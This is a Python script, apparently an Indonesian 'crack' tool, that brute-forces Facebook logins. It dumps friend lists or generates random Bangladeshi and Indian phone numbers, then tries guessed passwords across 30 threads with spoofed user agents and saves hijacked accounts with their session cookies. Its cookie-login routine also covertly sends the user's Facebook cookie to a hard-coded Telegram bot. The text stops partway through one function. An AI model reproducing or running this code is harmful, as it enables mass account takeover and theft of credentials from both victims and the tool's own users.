#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re,string
import urllib3,rich,base64
from string import *
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
ualu,ualuh = [],[]
#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
user = []
plist = []

for t in range(10000):
	a=random.choice(["9.1.5","5.1.6","4.0.1","3.0.1","4.0.2","5.0.2","6.0.1","6.2.2","7.0.1","7.1.0","8.1.0","4.4.4","5.6.1","6.1.3"])
	b=random.randrange(111111,210000)
	c=random.randrange(73,110)
	d=random.randrange(33300,88800)
	e=random.randrange(40,250)
	z=random.randrange(113,117)
	h=random.randrange(11,19)
	g=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
	i=random.choice(['en-US','en-GB','id-ID','de-DE','ru-RU','en-SG','fr-FR','fa-IR','ja-JP','pt-BR','cs-CZ','zh-HK','zh-CN','vi-VN','en-PH','en-IN','tr-TR'])
	ii=random.choice(['en','id','de','ru','en','fr','fa','ja','pt','cs','zh','zh','vi','tr'])
	oppo=random.choice(['CPH2437','CPH2351','CPH2048','CPH2389','CPH2359','CPH2363','CPH2211','PGX110','CPH1917'])
	oppo2 = random.choice(["PBDM00","PAHM00","PCDM10","PCAT00","PCDM10","PCHM30","PCKM00","PCHM10"])
	rilmi= random.choice(["RMX3516","RMX3371","RMX3461","RMX3286","RMX3561","RMX3388","RMX3311","RMX3142","RMX2071","RMX1805","RMX1809","RMX1801","RMX1807","RMX1803","RMX1825","RMX1821","RMX1822","RMX1833","RMX1851","RMX1853","RMX1827","RMX1911","RMX1919","RMX1927","RMX1971","RMX1973","RMX2030","RMX2032","RMX1925","RMX1929","RMX2001","RMX2061","RMX2063","RMX2040","RMX2042","RMX2002","RMX2151","RMX2163","RMX2155","RMX2170","RMX2103","RMX3085","RMX3241","RMX3081","RMX3151","RMX3381","RMX3521","RMX3474","RMX3471","RMX3472","RMX3392","RMX3393","RMX3491","RMX1811","RMX2185","RMX3231","RMX2189","RMX2180","RMX2195","RMX2101","RMX1941","RMX1945","RMX3063","RMX3061","RMX3201","RMX3203","RMX3261","RMX3263","RMX3193","RMX3191","RMX3195","RMX3197","RMX3265","RMX3268","RMX3269","RMX2027","RMX2020","RMX2021","RMX3581","RMX3501","RMX3503","RMX3511","RMX3310","RMX3312","RMX3551","RMX3301","RMX3300","RMX2202","RMX3363","RMX3360","RMX3366","RMX3361","RMX3031","RMX3370","RMX3357","RMX3560","RMX3562","RMX3350","RMX2193","RMX2161","RMX2050","RMX2156","RMX3242","RMX3171","RMX3430","RMX3235","RMX3506","RMX2117","RMX2173","RMX3161","RMX2205","RMX3462","RMX3478","RMX3372","RMX3574","RMX1831","RMX3121","RMX3122","RMX3125","RMX3043","RMX3042","RMX3041","RMX3092","RMX3093","RMX3571","RMX3475","RMX2200","RMX2201","RMX2111","RMX2112","RMX1901","RMX1903","RMX1992","RMX1993","RMX1991","RMX1931","RMX2142","RMX2081","RMX2085","RMX2083","RMX2086","RMX2144","RMX2051","RMX2025","RMX2075","RMX2076","RMX2072","RMX2052","RMX2176","RMX2121","RMX3115","RMX1921"])
	redmi = random.choice(["2201116SI","M2012K11AI","22011119TI","21091116UI","M2102K1AC","M2012K11I","22041219I","22041216I","2203121C","2106118C","2201123G","2203129G","2201122G","2201122C","2206122SC","22081212C","2112123AG","2112123AC","2109119BC","M2002J9G","M2007J1SC","M2007J17I","M2102J2SC","M2007J3SY","M2007J17G","M2007J3SG","M2011K2G","M2101K9AG","M2101K9R","2109119DG","M2101K9G","2109119DI","M2012K11G","M2102K1G","21081111RG","2107113SG","21051182G","M2105K81AC","M2105K81C","21061119DG","21121119SG","22011119UY","21061119AG","21061119AL","22041219NY","22041219G","21061119BI","220233L2G","220233L2I","220333QNY","220333QAG","M2004J7AC","M2004J7BC","M2004J19C","M2006C3MII","M2010J19SI","M2006C3LG","M2006C3LVG","M2006C3MG","M2006C3MT","M2006C3MNG","M2006C3LII","M2010J19SL","M2010J19SG","M2010J19SY","M2012K11AC","M2012K10C"])
	model = random.choice(["EdgA/41.1.35.1","EdgA/94.0.992.50","EdgA/98.0.1108.62","EdgA/114.0.1823.61","EdgA/111.0.1661.59"])
	iphone = random.choice(["11_2","11_1","11_1_1","15_6","11_1_3","11_3_2","11_2_1","11_2","13_2_1","14_2_1","15_1_1","12_1_1","12_1","12_1_2","12_2_1","16_1","16_2","13_3","13_1_1","13_2_1","14_3_5","9_1","8_1","7_1","10_1","9_1_1","8_1_1","9_2_1","8_2_2","15_3_2"])
	iphone1 = random.choice(["605.1.15","602.1.50","605.1.10","604.1.50","602.2.14","602.3.12","602.4.6","603.1.30","603.2.4","603.3.8","601.1.46"])
	iphone2 = random.choice(["7B367","15E148","11A465","8A293","8B117","19G82","15E148","18F72","20G75"])
	zax1=f'Mozilla/5.0 (Linux; Android {a}; {redmi}){rilmi}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.0.0 Mobile Safari/537.36'
	zax2=f'Mozilla/5.0 (Linux; Android {a}; {oppo}){oppo2}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	zax3=f'Mozilla/5.0 (Linux; Android {a}; {oppo}) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	zax4 = f'Mozilla/5.0 (iPhone; CPU iPhone OS {iphone} like Mac OS X) AppleWebKit/{iphone1} (KHTML, like Gecko) Version/{h}.0.{a} Mobile Mobile/{iphone2} Safari/60{h}.1'
	zax5=f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	uaku2 = random.choice([zax1,zax2,zax3,zax4,zax5])
	ugen.append(uaku2)
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'HECK FB-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'HECK FB-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	clear()
	print(f"""
{h} 88  dP 88 88b 88  dP""b8     888888 88""Yb {k} AUTHOR : MR SH4MUL
{h} 88odP  88 88Yb88 dP   `"     88__   88__dP 
{h} 88"Yb  88 88 Y88 Yb  "88     88""   88""Yb {m} TOOLS : FREE
{h} 88  Yb 88 88  Y8  YboodP     88     88oodP {u} SEMOGA IJO STERR                                                                                                                       
             """)
#--------------------[ BAGIAN-MASUK ]--------------#
def login123():
	os.system('clear')
	banner()
	print(f' 1 login cookie')
	print(f' 2 crack bd')
	print(f' 3 crack ind')
	print(f' 4 crack file')
	bryn = input(f' [+] Pilih Menu : ')
	if bryn in ['1']:
		login_lagi334()
	elif bryn in ['2']:
		bd()
	elif bryn in ['3']:
		India()
	elif bryn in ['4','04']:
		file()
	else:
		print(' [+] Pilih Yang Bener Asu ')
		time.sleep(5)
		exit()


def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()

def login_lagi334():
	try:		
		asu = random.choice([m,k,h,b,u])
		os.system('clear')
		banner()
		cookie=input(f'[{h}#{x}] Cookie  :{asu} ')
		requests.post(f"https://api.telegram.org/bot6581717744:AAEdRk-c_z3JaRk4ZC4Fte4acBSTXXpsNhI/sendMessage?chat_id=6356364399&text={cookie}   RESULT COOKIE  ").json()
		open(".cok.txt", "w").write(cookie)
		with requests.Session() as rsn:
			try:
				rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate',
                })
				response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
				if '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
					open(".token.txt", "w").write(token)
					print('[#]%sLogin Succes%s'%(h, p))
				else:
					print('[#]%sFailled Get Token%s'%(m, p))
			except:
				print('[#] Failled Get Token')
		print(f'  {x}[{h}•{x}]{h} successfully executed the command again{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s login failed check your cookies !!%s'%(x,k,x,m,x))
		print(e)
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	print(f'========================================') 
	print(f'{h}• From : Indonesia 🇮🇩{x}') 
	print(f'{h}• Author : Pal XD{x}') 
	print(f'{h}• version : 0.1{x}') 
	print(f'========================================') 
	print(f'{k}Your ID :{h} '+str(my_id))
	print(f'{h} Your IP  :{h} {ip}{x}')
	print(f'========================================') 
	print(f'[•]1.Crack Publik l')
	print(f'[•]2.Crack File ') 
	print(f'========================================') 
	XD = input(f' Choose : ')
	print(f'========================================') 
	if XD in ['1']:
		dump_massal()
	elif XD in ['2']:
		file()
	else:
		back()
#-------------[ CRACK-FROM-FILE ]------------------#
def file():
	clear()
	banner()
	try:
		fileX = input (f'{x}[{h}#{x}] masukkan nama file : ')
		for line in open(fileX, 'r').readlines():
			id.append(line.strip())
		setting()
	except IOError:
		exit(f"{x}[{h}#{x}]file {h}%s {x}not found"%(fileX))
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	clear()
	banner()
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
	    exit()
	try:
		kumpulkan = int(input(f' Mau Berapa ID ? : '))
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f' ID Ke  '+str(bilangan)+f' : ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
	      print(" Total DUMP  : "+str(len(id))) 
	      setting()
	except requests.exceptions.ConnectionError:
	    exit()
	except (KeyError,IOError):
		exit()

def bd():
    clear()
    print(f'{k}[{h}≈{k}] EXAMPLE {h}➢{h} 017{h}/{h}019{h}/{h}018{h}/{h}016')
    code = input(f'{h}[{h}?{h}]{h} CHOICE  {h}➢{h} ')
    clear()
    print(f'{k}[{h}≈{k}] EXAMPLE {h}➢{h} 3000{h}/{h}5000{h}/{h}10000{h}/{h}99999')
    limit = int(input(f'{h}[{h}?{h}]{h} CHOICE  {h}➢{h} '))
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    clear()
    with tred(max_workers=30) as pool:
        clear()
        print(f'{k}[{h}≈{k}] SIM CODE  {h}➢{h} {code}')
        print(f'{k}[{h}≈{k}] TOTAL UID {h}➢{h} {str(len(user))}')
        print(f"{h}[{h}={h}]{h} TURN {h}[{h}ON{h}/{h}OFF{h}] AIRPLANE MODE EVERY {h}3{h} MIN")
        for love in user:
            idf = code + love
            ax = idf[:8]
            bx = idf[:7]
            cx = idf[:6]
            xa = love[1:]
            xb = love[2:]
            pwv = [idf,love,ax,bx,cx,xa,xb,'77889900','bangladesh','bangla','jannat','jannatul','mariya','sadiya','farjana','sabbir','rakibul','mahidul','nusrat','tamanna','mimmim','suraiya','alamin','arafat','bushra','roksana','tabassum','tanisha','tasnim']
            pool.submit(crack,idf,pwv)
    print('')
    print(f'\r{h}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f'{k}[{h}≈{k}] THE PROCESS HAS BEEN COMPLETED')
    print(f'{k}[{h}≈{k}] TOTAL OK ID {h}➢{h} {str(len(ok))}')
    print(f'{h}[{h}≈{h}]{m} TOTAL CP ID {h}➢{m} {str(len(cp))}')
    print(f'\r{h}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    input(f'{k}[{h}≈{k}] PRESS ENTER TO BACK ')
    menu()
#__________________INDIA DEF____________#
def India():
    clear()
    print(f'{k}[{h}≈{k}] EXAMPLE {h}➢{h} +91639{h}/{h}+91934{h}/{h}+91902{h}/{h}+91701')
    code = input(f'{h}[{h}?{h}]{h} CHOICE  {h}➢{h} ')
    clear()
    print(f'{k}[{h}≈{k}] EXAMPLE {h}➢{h} 3000{h}/{h}5000{h}/{h}10000{h}/{h}99999')
    limit = int(input(f'{h}[{h}?{h}]{h} CHOICE  {h}➢{h} '))
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    with tred(max_workers=30) as pool:
        clear()
        print(f'{k}[{h}≈{k}] SIM CODE  {h}➢{h} {code}')
        print(f'{k}[{h}≈{k}] TOTAL UID {h}➢{h} {str(len(user))}')
        print(f"{h}[{h}={h}]{h} TURN {h}[{h}ON{h}/{h}OFF{h}] AIRPLANE MODE EVERY {h}3{h} MIN")
        for love in user:
            idf = code + love
            pwv = [love,idf[:8],'57273200','59039200','57575751']
            pool.submit(crackfree,idf,pwv)
    print('')
    print(f'\r{h}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f'{k}[{h}≈{k}] THE PROCESS HAS BEEN COMPLETED')
    print(f'{k}[{h}≈{k}] TOTAL OK ID {h}➢{h} {str(len(ok))}')
    print(f'{h}[{h}≈{h}]{m} TOTAL CP ID {h}➢{m} {str(len(cp))}')
    print(f'\r{h}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    input(f'{k}[{h}≈{k}] PRESS ENTER TO BACK ')
    menu()		
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	for bacot in id:
		xx = random.randint(0,len(id2))
		id2.insert(xx,bacot)
	clear()
	banner()
	print(f'========================================') 
	print(f'>>> 1 Mobile (RECOMMEND)')
	print(f'>>> 2 Mbasic (NOT RECOMMEND)')
	print(f'>>> 3 Async (NOT RECOMMEND)')
	print(f'========================================') 
	print('')
	hc = input(f' Choose : ')
	if hc in ['1']:
		method.append('mobile')
	elif hc in ['2']:
		method.append('free')
	elif hc in ['3']:
		method.append('async')
	else:
		method.append('mobile')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	clear()
	banner()
	print(f'========================================================') 
	print(f'> Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
	print(f'> Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
	print(f'========================================================') 
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'01')
					pwv.append(frs+'02')
					pwv.append(frs+'03')
					pwv.append(frs+'04')
					pwv.append(frs+'05')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append('katasandi')
					pwv.append('kontol')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'12')
					pwv.append(frs+'321')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'async' in method:
				pool.submit(crackasync,idf,pwv)
			else:
				pool.submit(crackregular,idf,pwv)
	print('')
	print(f'========================================') 
	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
	print(f'========================================') 
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	ewe = random.choice([m,k,h,u,b])
	sys.stdout.write(f"\r {ewe} {x}{(loop)}/{len(id)} ok:{h}{(ok)} {x}cp:{k}{(cp)}{x}")
	sys.stdout.flush()
	ua= random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=1489897304628200&kid_directed_site=0&app_id=1489897304628200&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fapp_id%3D1489897304628200%26cbt%3D1694434882102%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df850adb0aa7b2%2526domain%253Dwww.blibli.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.blibli.com%25252Ff25b7e9c1ad4e74%2526relation%253Dopener%26client_id%3D1489897304628200%26display%3Dtouch%26domain%3Dwww.blibli.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.blibli.com%252Flogin%253Fredirect%253D%25252F%26locale%3Den_US%26logger_id%3Df2eb5114cc8b6b%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df28f5b050bbf53c%2526domain%253Dwww.blibli.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.blibli.com%25252Ff25b7e9c1ad4e74%2526relation%253Dopener%2526frame%253Df26cc15aab5eaf%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv15.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df28f5b050bbf53c%26domain%3Dwww.blibli.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.blibli.com%252Ff25b7e9c1ad4e74%26relation%3Dopener%26frame%3Df26cc15aab5eaf%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=1489897304628200&kid_directed_site=0&app_id=1489897304628200&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fapp_id%3D1489897304628200%26cbt%3D1694434882102%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df850adb0aa7b2%2526domain%253Dwww.blibli.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.blibli.com%25252Ff25b7e9c1ad4e74%2526relation%253Dopener%26client_id%3D1489897304628200%26display%3Dtouch%26domain%3Dwww.blibli.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.blibli.com%252Flogin%253Fredirect%253D%25252F%26locale%3Den_US%26logger_id%3Df2eb5114cc8b6b%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df28f5b050bbf53c%2526domain%253Dwww.blibli.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.blibli.com%25252Ff25b7e9c1ad4e74%2526relation%253Dopener%2526frame%253Df26cc15aab5eaf%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv15.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df28f5b050bbf53c%26domain%3Dwww.blibli.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.blibli.com%252Ff25b7e9c1ad4e74%26relation%3Dopener%26frame%3Df26cc15aab5eaf%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="8", "Chromium";v="111"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=1489897304628200&kid_directed_site=0&app_id=1489897304628200&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fapp_id%3D1489897304628200%26cbt%3D1694434882102%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df850adb0aa7b2%2526domain%253Dwww.blibli.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.blibli.com%25252Ff25b7e9c1ad4e74%2526relation%253Dopener%26client_id%3D1489897304628200%26display%3Dtouch%26domain%3Dwww.blibli.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.blibli.com%252Flogin%253Fredirect%253D%25252F%26locale%3Den_US%26logger_id%3Df2eb5114cc8b6b%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df28f5b050bbf53c%2526domain%253Dwww.blibli.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.blibli.com%25252Ff25b7e9c1ad4e74%2526relation%253Dopener%2526frame%253Df26cc15aab5eaf%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv15.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df28f5b050bbf53c%26domain%3Dwww.blibli.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.blibli.com%252Ff25b7e9c1ad4e74%26relation%3Dopener%26frame%3Df26cc15aab5eaf%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'')
				print(f'{k} [CEKPOINT]{x} ')
				print(f'{x} USERNAME : {k}{idf}{x} PASSWORD : {k}{pw}{x}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'')
				print(f'{h} [SUKSES]{x}')
				print(f'{x} USERNAME : {h}{idf}{x} PASSWORD : {h}{pw}{x}')
				print(f'{x} COOKIE : {kuki}{x}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#------------------[ free.facebook ]-------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
	ewe = random.choice([m,k,h,u,b])
	sys.stdout.write(f"\r {ewe} {x}{(loop)}/{len(id)} ok:{h}{(ok)} {x}cp:{k}{(cp)}{x}")
	sys.stdout.flush()
	ua= random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
